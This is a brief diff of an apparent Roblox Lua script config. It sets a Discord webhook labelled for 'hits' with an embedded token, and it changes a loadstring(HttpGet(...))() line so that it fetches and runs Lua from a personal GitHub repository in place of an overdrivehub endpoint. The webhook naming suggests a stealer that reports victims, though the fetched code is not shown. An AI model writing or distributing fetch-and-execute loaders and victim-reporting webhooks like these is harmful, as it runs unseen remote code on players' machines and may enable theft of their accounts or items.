@@ -14,4 +14,4 @@ SmallHitsWebhook = "https://discord.com/api/webhooks/1385646380504322109/BU2QZ14
 
 ODH_KEY = "" -- if you are a free user, enter your key here to auto validate.
 
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratleahh/Summer-UPD/refs/heads/main/Initializer.lua"))()
